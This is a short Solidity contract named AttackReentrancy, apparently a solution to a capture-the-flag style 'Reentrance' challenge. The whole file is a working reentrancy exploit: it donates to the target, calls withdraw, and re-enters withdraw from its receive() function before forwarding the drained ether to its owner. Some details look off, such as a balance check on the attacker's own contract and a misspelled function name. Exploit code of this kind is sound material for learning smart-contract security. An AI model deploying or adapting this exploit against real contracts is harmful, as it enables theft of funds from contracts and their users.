// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Reenterancy.sol";

contract AttackReentrancy {
    Reentrance reentrance;
    address private owner;

    constructor(Reentrance _reentrance){
        reentrance = _reentrance;
        owner = payable(msg.sender);
    }


    modifier onlyOwner() {
        require(owner == msg.sender,"not a owner");
        _;
    }

    function expliot() external payable {
        reentrance.donate{value:msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        uint256 targetBalance = address(this).balance;

        if (targetBalance >= 1 ether){
            reentrance.withdraw(msg.value);
        }
        
        else{
            (bool success,) = owner.call{value:address(this).balance}("");
            require(success,"transfer failed");
        }
    }


}